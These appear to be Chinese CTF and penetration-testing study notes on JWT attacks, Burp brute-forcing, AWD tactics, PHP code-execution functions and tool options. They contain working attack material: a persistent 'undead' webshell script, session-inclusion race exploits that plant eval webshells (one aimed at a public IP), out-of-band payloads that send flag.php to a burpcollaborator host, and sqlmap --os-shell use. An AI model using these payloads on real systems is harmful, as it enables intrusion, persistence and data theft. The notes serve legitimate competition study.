    >比如说服务端用HMAC-SHA256加密算法，再加上一个只有服务端才知道的密钥，对数据做一个签名，把这个签名和数据一起作为token发给客户端，客户端收到 Token 以后可以把它存储起来，比如存储在 Cookie 里或者 Local Storage 中，由于密钥除了服务端任何其他用户都不知道， 就无法伪造令牌(Token)。

    用户把这个token发给服务端时，服务端使用相同的HMAC-SHA256算法和相同的密钥，对数据再计算一次签名，跟token中的签名做个对比，如果相同，说明用户已经登录过了，即验证成功。若不相同，说明这个请求是伪造的

## 区别

* cookie和session区别

    作用范围不同，Cookie 保存在客户端，Session 保存在服务器端。

    存取方式不同，Cookie只能保存`ASCII`,Session可以存任意数据类型

    有效期不同，Cookie 可设置为长时间保持，比如我们经常使用的默认登录功能，Session 一般失效时间较短，客户端关闭或者 Session 超时都会失效

    隐私策略不同，Cookie 存储在客户端，比较容易遭到不法获取，Session 存储在服务端，安全性相对 Cookie 要好一些。

    存储大小不同， 单个 Cookie 保存的数据不能超过 4K，Session 可存储数据远高于 Cookie。

* token(存储在 Local Storage中)跟cookie区别

    token无状态的，后端服务不需要记录token。

    token 的 CORS 可以很好的处理跨域的问题。由于每次发送请求到后端，都需要检查 JWT，只要它们被验证通过就可以处理请求。cookie只能单域或者子域

    token支持移动平台，cookie不支持
    
    可防跨站请求（CSRF），因为token黑客难构造也无法通过CSRF获取

## JWT

* 定义

    JSON Web Token (JWT)是一个开放标准(RFC 7519)，它用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的，本质上也是token

* 使用场景

    Authorization (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。

    Information Exchange (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWT可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。

* 构成

    是由三段信息构成的，用.将三段信息连成一个JWT字符串，类似于`aa.bb.cc`。

    *头部（header）.消息体（payload）.签证（signature)*

    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ

    注意：header和payload不要写入敏感信息

    * header

        主要有两个部分:声明类型(这里是jwt),声明加密算法(HMAC-SHA256和RSA等，通常直接使用HMAC SHA256)

        就像下面的json

            ```json
            {
                'typ':'JWT',
                'alg':'HS256'
            }
            ```
        之后用base64对这个json编码就得到第一段信息

    * payload

        消息体就是存放有效信息的地方，它包含声明（要求），声明是关于实体(通常是用户)和其他数据的声明，声明有三种类型。

        标准中注册的声明
        公共的声明
        私有的声明

        * 标准中注册的声明

            ```php
            iss: jwt签发者
            sub: jwt所面向的用户
            aud: 接收jwt的一方
            exp: jwt的过期时间，这个过期时间必须要大于签发时间
            nbf: 定义在什么时间之前，该jwt都是不可用的.
            iat: jwt的签发时间
            jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击
            ```
        
        公共的声明 ：
        公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息，自定义

        私有的声明 ：
        私有声明用于同意使用它们的各方之间共享信息，并且不是注册的或公开的声明

        例子:{"sub": '123426711', "name": 'assion', "admin":true }

        之后base64加密

    * signature

        这个签证信息由三部分组成：header (base64后的)、 payload (base64后的) 、secret（盐=私钥）

        这个部分需要header (base64后的)和payload (base64)后的使用.连接组成的字符串，然后通过header中声明的加密方式进行加secret盐组合加密，然后就构成了jwt的第三部分。

        ```js
        // javascript
        var encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);
        var signature = HMACSHA256(encodedString, 'secret'); 
        //TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
        ```

        注意:secret（私钥）是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，不能泄露出去

* 爆破密钥

    c-jwt-cracker

* 签名算法更改(不使用密钥)

    签名算法确保恶意用户在传输过程中不会修改JWT。但是标题中的alg字段可以更改为none。有些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+‘.’+ payload +‘.’）并将其提交给服务器。

# 暴力破解

## burpsuite

### 爆破模式

* sniper

    适用于单个爆破位置，将所有`payload`在同一位置进行尝试

* battering ram(攻城锤)

    多个位置，同时使用相同`payload`

* pitch fork(草叉)

    多个位置，每个位置都需要配置字典，爆破时各个位置分别使用自己列表中相同位置的`payload`

    ```php
    position1:1,2
    position2:3,4

    =>1,3  =>2,4
    ```
    
* cluster bomb

    多个位置，使用笛卡尔乘积尝试`payload`，遍历每一种可能的请求结果

    ```php
    position1:1,2
    position2:3,4

    =>1,3  =>1,4  =>2,3 =>2,4
    ```

### payload type

* custom iterator(自定义迭代器)

    支持不同位置`payload`进行拼接，分别设置不同位置使用多个`payload`，然后拼接起来统一进行处理

    使用迭代器的时候攻击位置为`1`就可以了

### payload processing

* 增加一种新的处理(编码)方式对`payload`进行处理


## 带有token爆破

* grep-extract

    变量选中token，转到options->grep-extract

    点fetch response先获取一个返回包

    用鼠标选中token值，上面自动填写前后匹配规则，记得将token值复制并保存，等等用

    重定向要设置为`总是`

* payloads

    选中token的位置，例如第二个位置

    payload格式为recursive grep 也就是递归搜索

    需要设置第一个请求值，填入刚刚复制的token

* attack

    1. 开始之后直接筛选返回包长度，不同的即可能为请求成功的

    2. options中可以设置grep-match，表示匹配返回包中内容，我们可以匹配login success，匹配到的会在返回结果记录的框中打勾



# 流量包分析
>(CTF-流量包分析get flag思路)[https://www.jianshu.com/p/a5dc4f6cf3f8]
## binwalk判断是否传输文件

`binwalk xxx.xxx`查看具体信息
`binwalk -e xxx.xxx`将其中的文件释放

## dd提取文件

`dd if=输入文件名 of=输出文件名 skip=偏移量 bs=1`

binwalk对文件进行分析之后，有地址表明压缩包文件或者其他隐写文件是从哪个位置开始的，该地址作为偏移量输入到skip参数后面

## foremost提取文件

`foremost xxx.xxx`

## file 查看具体文件类型

`file xxx.xxx`

## strings提取文件内字符

`strings xxx.xxx|grep -a flag`提取flag字样字符
`strings xxx.xxx | base64 -d`base64解码获得的内容

## 以图片格式直接查看数据

选中流量包中multidata部分，右键显示分组字节流，显示格式为图像，即可


# 日志分析

## linux-shell

* 使用命令

    ```php

    cat access.log | grep " 200 " | awk -F " " '{print $7}' | sort | uniq -c | sort -n

    # 提取200响应码内容 用空格作分割，提取路径字段 sort分类一下 ， uniq -c 去重并统计重复次数，sort -n 根据重复字段从小到大排列

    ```

## windows-cmd

    ```php

    type access.log.bak | findstr " 200 " | find /V "不想要的字段"

    type test.txt | findstr " 200 " | for /f "tokens=1,3 delims=," %i in ('findstr " 200 "') do @echo %i %j

    type access.log.bak | (for /f "tokens=7 delims= " %i in ('findstr " 200 "') do @ECHO %i )| sort /unique

    ```

## windows-powershell

    ```powershell

    Get-Content access.log.bak | Select-String " 200 " | ForEach-Object {$_.ToString().Split(' ')[6]} | Sort-Object | Select-String -notmatch "fckeditor|index|uploads|js|css|images|upload.php|manage.php|icons|footer|fonts|\/\?" | Group-Object
    # Get-Content 获取内容
    # Select-String 选取对应内容 -notmatch 剔除 -Unique 去重
    # Sort-Object 对内容进行分类
    # Group-Object 去重并统计次数

    ```

## windows-sublime

    ```php

    正则匹配

    ```

# 常见命令


## linux

* 读文件
    * `cat`

        正序读文件，从第一行

    * `tac`

        反向读文件，从尾行向上读取

    * `more/less`

        适应窗口大小输出文件内容
        `less`还可以翻页

    * `head/tail`

        读头几行尾几行
    
    * `nl`

        带行号输出

* find

    `find / -name xxx`

* tee

    `ls / | tee 3 `将结果输出到3文件
    
## 注

* `php`+`linux`

    ```php
    $c=$_GET['c'];
    eval($c);
    ======>
    echo `find / -name fl\ag.php`;

    ```

# 正则匹配

## 修饰符元字符

    . 匹配除换行符以外的任意字符

    \w 匹配字母或数字或下划线或汉字 等价于 '[^A-Za-z0-9_]'。

    \s 匹配任意的空白符

    \d 匹配数字

    \b 匹配单词的开始或结束

    ^ 匹配字符串的开始

    $ 匹配字符串的结束

    \w 能不能匹配汉字要视你的操作系统和你的应用环境而定

# AWD

-------------攻击思路-------------

1.如果是ssh弱口令，可以用msf的ssh批量获取

2.预留后门查找，网站源码放到D盾中webshellkill，检查预留后门，这是为了防止传不上webshell

3.发现漏洞，与文件读取有关的点，SQL注入写shell、文件上传、文件包含、命令执行代码执行、反序列化

	* SQL

		sqlmap -u xxxxxxxx --os-shell

	* 文件上传

		常见的上传马的方式

	* 命令执行

		echo "base64编码" | base64-d >>index.php

		<?php ?>
	


4.如果成功上传webshell，记得修改连接密码，防止被其他队伍利用

5.msf启动终端

	python -c "import pty;pty.spawn('/bin/bash')"

6.渗透msf常用命令

	msfconsole  启动msf
	search xxxx 搜索对应中间件或者关键字

	use <数字>  选择对应的模块
	<要确认自己选中的是exploit或者auxiliary模块>

	show options 显示模块需要设置的参数

	set <参数名> <参数>----set rhosts <主机IP>  设置参数

	run 执行模块

6.2 后渗透meterpreter

	getsystem  获取系统权限
	shell	   获取系统交互shell
	<获取系统交互shell后要根据系统语言环境起一个bin/bash下的shell>
	python -c 'import pty;pty.spawn("/bin/bash")'


7.服务发现nmap

	nmap -sP 192.168.43.0/24  主机发现
	nmap -sV 192.168.43.0/24  服务发现
	nmap -sV -A 192.168.43.0/24  服务带版本详细信息
	nmap -p- -T5 192.168.43.198

8. 主机发现

	arp-scan -l
	netdiscover -i eth0

9. ping

	for i in {1..255};do echo "172.17.0.1" >>test.txt;done

	ping 



10. 不死马(和下面的代码都放到index.php)

```php

	<?php
    set_time_limit(0);
    ignore_user_abort(1);
    unlink(__FILE__);
    //file_put_contents(__FILE__,'');
    while(1){

        file_put_contents('path/webshell.php','<?php     @eval($_POST["Squ@rq1"]);?>');
    }
?>

```

11. 搅屎

```php

<?php
    set_time_limit(0);
    ignore_user_abort(true);
    while(1){
        file_put_contents(randstr().'.php',file_get_content(__FILE__));
        file_get_contents("http://127.0.0.1/");
    }
?>



```

-------------防御思路------------
1.刚上来先登录ssh，如果是弱口令就要考虑直接用msf的ssh模块批量获取其他机器的shell
	
	search scanner/ssh
	show

2.连接成功之后，先修改登陆密码，然后备份网站源码

	passwd   输两遍密码，没有回显的

	tar -P -zcvf /tmp/web1.tar.gz /var/www/html   备份源码

	tar -P -zxvf /tmp/web.tar.gz           恢复网站源码

	或者直接用ssh连接工具copy下来一份

-------------登录数据库备份数据库------------

	mysql -u root -p Test > Test001.sql     备份数据库

	mysql -u root -p Test < Test001.sql		恢复数据库


3.修改数据库登录密码

	mysql -u root -p//登录
	
	databases；use test;show tables;

	select * from admin;

	updata admin set user pass=’123456’; //updata 表名 set 字段名 = ‘值’;

	flush privileges;

	--------数据库外改密码-----------


	mysqladmin -uroot -p 123456 password 123 root=用户名； 123456=旧密码； 123=新密码；

	--------登陆后修改数据库密码------
	
	set password for admin@localhost = password('a_strong_pass');

4.检查后门

	网站备份文件拿下来之后，放到D盾扫一下有没有预留后门，如果有，告诉攻击手后门位置并删除本地后门

5.检测漏洞

	网站源码放到seay中进行代码审计

6.命令别名

	alias cat="echo flag{adasd-xasd-xasd}"

	unalias cat //取消别名

7.查文件

	find /var/www/html -type f -mmin -30|xargs stat      查找30分钟内容被修改的所有文件，实际使用按需求改路径

8.改权限

	chmod <权限>

	chattr +i <文件名>  文件不能以任何形式修改，文件root用户也无法删除

	chattr -i <文件名>	去掉i权限，恢复能修改状态

* crontab

	crontab:
	cat /etc/crontab*与crontab -l 查看定时任务
	crontab -l -u www-data 查看www用户的crontab
	crontab -r 删除定时任务，需要www权限

* SQL注入过滤函数

	addslashes()在单引号、双引号、NULL、反斜杠之前加转义符

	htmlspecialchars()将特殊字符转义为html实体

	trim() — 去除字符串首尾处的空白字符（或者其他字符）

	strip_tags() — 从字符串中去除 HTML 和 PHP 标记

    预编译


# 其他

## inda编码转utf-8编码绕过

>[[SUCTF 2019]Pythonginx](https://blog.csdn.net/qq_51684648/article/details/123501658)

字符经过inda编码再经过utf-8解码之后可以变成特定的组合，可以绕过过滤

字符合集也可以看SSRF模块的绕过

跑字符脚本

```python

for i in range(128,65537):    
    tmp=chr(i)    
    try:        
        res = tmp.encode('idna').decode('utf-8')        
        if("-") in res:            
            continue        
        print("U:{}    A:{}      ascii:{} ".format(tmp, res, i))    
    except:        
        pass

```

## DNS rebinding

>来源于==>[浅谈DNS重绑定漏洞](https://zhuanlan.zhihu.com/p/89426041)

* 概念

    在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。

* 步骤

    1.攻击者控制恶意的DNS服务器来回复域的查询,如rebind.network
    2.攻击者通过一些方式诱导受害者加载http://rebind.network
    3.用户打开链接,浏览器就会发出DNS请求查找rebind.network的IP地址

    4.恶意DNS服务器收到受害者的请求,并使用真实IP地址进行响应,并将TTL值设置为1秒,让受害者的机器缓存很快失效

    5.从http://rebind.network加载的网页包含恶意的js代码,构造恶意的请求到http://rebind.network/index,而受害者的浏览器便在执行恶意请求
    
    6.一开始的恶意请求当然是发到了攻击者的服务器上,但是随着TTL时间结束,攻击者就可以让http://rebind.network绑定到别的IP,如果能捕获受害者的一些放在内网的应用IP地址,就可以针对这个内网应用构造出对应的恶意请求,然后浏览器执行的恶意请求就发送到了内网应用,达到了攻击的效果

## IP来源判断

* X-Forwarded-For

* X-REAL-IP

* CLIENT-IP


## 管道符

* `&`

    命令后加&表示将进程放在后台

* `&&`

    前一条命令成功执行才执行后一条命令

* `|`

    将上一条命令的输出作为下一条命令的输入

* `||`

    上一条命令执行失败之后才会执行下一条命令

* `>`

    将内容作为标准输出信息*覆盖*写入某一位置

* `>>`

    将内容作标准输出信息*追加*写到某一位置

* `<`

    将内容作标准输入流读入前命令

* `<< xxx`

    从某位置读入输入信息，直到匹配道与xxx相同的内容然后停止
    
* `&>`

    不管命令执行结果是正确信息还是错误信息都覆盖输入到xxx

* ``

## 语言特性

* `php`反引号

    `php`中反引号中的内容会当作命令执行，和`system()`有着相似的作用

* `file_get_contents()`

    函数将文件内容读取为字符串形式，所以说这个函数可以结合`data://`伪协议，该伪协议是将文本内容进行输出，这样一结合就可以包含自己想要的内容

* `include()`
    
    可以包含文件包含变量，或者引入其他内容

* `<?=?>`

   `php`短标签，`<?php ?>`是长标签，在php的配置文件`(php.ini)`中有一个`short_open_tag`的值，开启后可以使用PHP短标签`<??>`

   同时，只有开启这个才可以使用`<?=`代替`<? echo` <??>

   但是短标签是不推荐的，使用`<?php ?>`才是规范的方法，只是因为这种短标签使用的时间比较长，这种特性才被保存下来。

* `./flag.php`

    结合目录访问特性绕过全字正则匹配

* `ereg`

    匹配字符串中的指定内容，存在NULL截断漏洞，可以用%00绕过

* `eregi`

    不区分大小写的匹配，二次url编码绕过

* `GLOBALS`

    全局变量，可以用来赋值，然后`var_dump`

* `_`函数

    `gettext()`函数的别名，返回文本信息

## 代码执行函数集合

* `eval`
* `preg_replace+/e`
* `assert`
* `call_user_func($参数，$函数)`

    `call_user_func_array()`

* `create_function($参数，$函数)`

    适用范围：PHP4>=4.0.1 PHP5 PHP7
    创建一个新的匿名函数，并将第一个变量作为参数传给函数，为其返回唯一名称

    ```php
    <?php
    $newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
    echo "New anonymous function: $newfunc\n";
    echo $newfunc(2, M_E) . "\n";
    ?>
    ```

* `array_map()`

    将用户自定义函数作用到数组中每个值上

    ```php
    <?php
    //?func=system&cmd=ipconfig
    $func=$_REQUEST['func'];
    $cmd=$_REQUEST['cmd'];
    $array[0]=$cmd;
    $new_array=array_map($func,$array);
    ?>
    ```

* `array_filter`

    `array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array`

    依次将array数组中的每个值传递到callback函数，如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。

    ```php
    <?php
    //?func=system&cmd=whoami
    $cmd=$_REQUEST['cmd'];
    $array1=array($cmd);
    $func =$_REQUEST['func'];
    array_filter($array1,$func);#把前面的数组内容传到后面的函数中(callback函数)
    ?>
    ```


## 显示文件内容函数总结

* `file_get_contents()`

    将整个文件的内容读入一个字符串

* `readfile()`

    读取文件并输出到缓存
    
* `highlight_file()`

    别名为`show_source()`

* `fopen()`

    将指定文件打开并绑定到一个流上
    `$handle = fopen("c:\\folder\\resource.txt", "r");`

* `fread()`

    ```php
    <?php
    $filename = "c:\\files\\somepic.gif";
    $handle = fopen($filename, "rb");
    $contents = fread($handle, filesize($filename));
    fclose($handle);
    ?> 

    ```

* `fgetss($handle, 4096)`

    从文件指针中读取一行并过滤html标记

* `fgets($handle, 4096)`

    从文件指针中读取一行

* `parse_ini_file()` 

* `file()`

    将整个文件的内容读入一个数组

* `unicode`单个字符可以表示很大的数字

## 命令执行函数集合

* `system()`

    执行外部程序，并且显示输出

* `exec()`

    执行一个外部程序
    如果要获得运行结果，要使用output参数
    ```php
    echo exec(ls);
    ```

* `shell_exec()`

    通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回

* `passthru()`

    执行外部程序并且显示原始输出

* `pcntl_exec()`???暂不明

    在当前进程空间执行指定程序

* `popen`

    调用fork()产生子进程，然后从子进程调用/bin/sh -c来执行参数command命令

    >参数type可使用“r”代表读取，“w”代表写入。依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中。此外，所有使用文件指针(FILE*)操作的函数也都可以使用，除了fclose()以外。

    如果 type 为 “r”，那么调用进程读进 command 的标准输出。
    如果 type 为 “w”，那么调用进程写到 command 的标准输入。

    `popen($command,'r')`


<!--
* `proc_open()`
-->

* 反引号包住要执行的命令


## 利用集合

* 函数组合

    `show_source(next(array_reverse(scandir(current(localeconv())))));`
    其中`show_source()`的别名是`highlight_file()`,`current()`的别名是`pos()`

    同理，`readfile()`也有相同作用

    `show_source(array_rand(array_flip(scandir(current(localeconv())))));`
    `show_source(session_id(session_start()));`
    `eval(hex2bin(session_id(session_start())));`

* 造参传参

    `c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php`

* sessionid()

    `c=session_start();system(session_id());PHPSSID=ls`

* 

## 常用端口服务对应表

* tcp

    21-----ftp
    22-----ssh
    23-----telnet
    25-----SMTP
    53-----DNS
    80-----HTTP
    110----POP3
    143----IMAP
    443----HTTPS
    1433---MSSQL
    3306---MYSQL
    3389---RDP
    6379---Redis
    7001/7002---Weblogic
    8080---tomcat
    9002---ElasticSearch

    

## 抓包改包

* `burpsuite`get改post

    请求方式改成`POST`

    加入`content-type:application/x-www-form-urlencoded`

    最下面加上要传的参数


## python开SMB

```shell

user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share


```

## 概念科普

* base64编码过程

    base64是一种用64个可打印字符表示二进制数据的方式
    
    也就是将每3个8Bit数据转换为4个6Bit数据进行传输

* php探针
    
    用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息

* `php`中`GET`请求参数不用单引号引起来也可以是因为利于`php向下兼容`

* `/dev/null`:表示 的是一个黑洞，通常用于丢弃不需要的数据输出， 或者用于输入流的空文件

    1.1 将无用的输出流写入到黑洞丢弃。

    `curl -Iwww.baidu.com 2>/dev/null | head -l`  错误信息定位到黑洞

    1.2 清空文件 

    `cat /dev/null > /home/omc/h.txt`

    1.3 在书写定时任务总，规范的写法就是将所有定时任务脚本结尾加上>/dev/null 2>&1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃。

* 有三种输出流，1标准输出，2错误输出，3异常输出

* `dnslog`

    * dns请求有日志记录，日志可以查看有多少ip访问该域名

    * 可以查看请求数据

    ```php
    /?F=`$F` ; ping `cat flag.php `.xxxx.cn -c

    /?F=`$F` ; nl flag.php>/tmp/1

    /?F=`$F` ; ping `nl flag.php | awk 'NR==15'| tr -cd "[a-z]"/"[0-9]"/"-"`.xxxx.cn -c 1
    /?F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net
    查看dnslog.cn就可以看到数据

        平常也可以使用带外的方法，只需要能够执行wget命令，然后直接wget `ls`.dnslog.org这样，就能看结果


    ```

* 硬空格

    ```php

    %C2%A0 是 URL 编码中的一种转义序列，表示的是 Unicode 字符集中的非断行空格字符（U+00A0），也称为“不间断空格”或“硬空格”。

    在 URL 中，空格通常被编码为 %20，但是在某些情况下，使用 %C2%A0 可能更合适，例如在 HTML 中使用硬空格来强制单词之间的换行。

    需要注意的是，%C2%A0 与普通的空格字符在视觉上是相同的，但是它们在计算机中被视为不同的字符，因此在处理 URL 和文本时应该加以区分。

    ```

* 同源策略

    同源策略（Same-Origin Policy，简称SOP）是一种约束Web安全模型的规则。同源策略要求，网页只能与加载它们的同一来源的资源进行交互，而与其他来源的资源交互必须经过明确的授权。

    所谓“同源”，指的是两个URL的`协议、域名和端口号`都相同。只有同源的网页才能互相访问彼此的数据和方法。换句话说，浏览器只允许包含在同一域名下的脚本之间交互，而不允许包含在不同域名下的脚本之间交互。

    同源策略的主要作用是保护用户的隐私和安全，防止恶意页面从网络上获取用户的隐私信息或进行跨站点脚本攻击（Cross-Site Scripting, XSS）等操作。

    需要注意的是，同源策略只是浏览器的一种安全机制，而不是Web开发中的一种具体实现方法，是一种底层的、通用的安全原则。 因此在Web开发中，应当尽可能去遵循同源策略，以保证Web应用程序的安全性和稳定性。

* unable to fork xxxx

    php执行系统命令函数遇到的报错，每次执行`system()`都会fork一个新的进程，这个报错意思是用户进程数达到上限，可以用蚁剑连一下试试，可能会成功

* base64原理

    
    即“基于64个字符的编码”，26个大写字母，26个小写字母，10个数字，还有`+`和`\`，编码过程为，先将要编码的数据八位一组分组，再用六位一组读取值，对照base64编码表（大写字母+小写字母+数字+两个符号依次排序），0-64，分别赋予数字对应的字母

    `P`->ascii`80`->二进制`01010000`->六位`010100`->十进制`20`->对照base64表为第二十个字符`U`

# 脚本

## 爆破脚本


## 绕过测试
>[ctfshow web入门 web41](https://blog.csdn.net/miuzzx/article/details/108569080)

>生成可用字符集合
```php
<?php
$myfile = fopen("rce_or.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)|urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);

```

>传递参数

```python
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
os.system("php rce_or.php")  #没有将php写入环境变量需手动运行
if(len(argv)!=2):
   print("="*50)
   print('USER：python exp.py <url>')
   print("eg：  python exp.py http://ctf.show/")
   print("="*50)
   exit(0)
url=argv[1]
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("rce_or.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))
   data={
       'c':urllib.parse.unquote(param)
       }
   r=requests.post(url,data=data)
   print("\n[*] result:\n"+r.text)

```

## session 文件包含

ctfshow-82

```php
#coding=utf-8
​
import io
import requests
import threading
sessid = 'TGAO'
data = {"cmd":"system('whoami');"}
def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )
def read(session):
    while True:
        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)
        if 'tgao.txt' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[+++++++++++++]retry")
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in xrange(1,30): 
            threading.Thread(target=write,args=(session,)).start()
        for i in xrange(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()


```


```python
import requests
import io
import threading

url='http://114.115.207.198:200/aGho.php'
sessionid='ctfshow'
data={
	"c":"file_put_contents('/var/www/html/2.php','<?php eval($_POST[2]);?>');"
}

def write(session):
	fileBytes = io.BytesIO(b'a'*1024*50)
	while True:
		response=session.post(url,
			data={
			'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'
			},
			cookies={
			'PHPSESSID':sessionid
			},
			files={
			'file':('ctfshow.jpg',fileBytes)
			}
			)

def read(session):
	while True:
		response=session.post(url+'?file=/tmp/sess_'+sessionid,data=data,
			cookies={
			'PHPSESSID':sessionid
			}
			)
		resposne2=session.get(url+'2.php');
		if resposne2.status_code==200:
			print('++++++done++++++')
		else:
			print(resposne2.status_code)

if __name__ == '__main__':

	evnet=threading.Event()
	with requests.session() as session:
		for i in range(5):
			threading.Thread(target=write,args=(session,)).start()
		for i in range(5):
			threading.Thread(target=read,args=(session,)).start()

	evnet.set()


```

# 工具参数

## SQLmap
>强大的sql注入工具
>https://www.freebuf.com/sectool/164608.html

* `-m`

    从文件列表中中逐个对指定的目标进行注入

* `-r`

    使用保存好的文件请求包进行注入，可以省去一些参数的设置比如cookie和POST数据


* `--user-agent`

    指定agent

* `--referer`

    指定referer，referer伪造，指明从哪个页面过来的

* `--data`

    --data=DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。--data="id=1" -f --banner --dbs --users

* `--dbms`

    指定数据库管理系统

* `--header`

    指定请求头内容，–headers=“Content-Type: text/plain”

* `--cookie`

    指定cookie值`--cookie="PHPSESSID=xxx"`

* `--safe-url`

    指定跳转页面前访问的页面，绕过鉴权

* `--safe-freq`

    指定前页面的访问次数

* `--file-read`

    读取指定文件

* `--os-shell`

    获取系统shell

* `--smart`

    它启用了一种启发式算法来自动检测和尝试提取可能的注入点。它的目的是减少需要手动指定注入点的数量，从而简化渗透测试的过程。

* `--level、--risk`

    等级(1-5)风险(0-3)，数值越大尝试越多，包括盲注的时间变长，防止网络延迟原因误报

* `--tamper`

    指定tamper脚本，space2comment，randomcase(大小写混写)

    

### SQLMAP特性

* 自动判断闭合

    --batch

## dirseach

* -x -i

    `-x xxx,xxx`不包括状态码，可以指定范围`400-499`

    `-i xxx,xxx`包括状态码，指定范围`200-299`

* -e

    `-e txt,html`
    `-e *`

    指定后缀

* -t 指定线程

* --delay

    `-t 5 --delay 0.5`挺好用

* -w 

    `-w xxx.txt,aaa.txt,kkk.txt`指定字典

* 

## nmap

* ``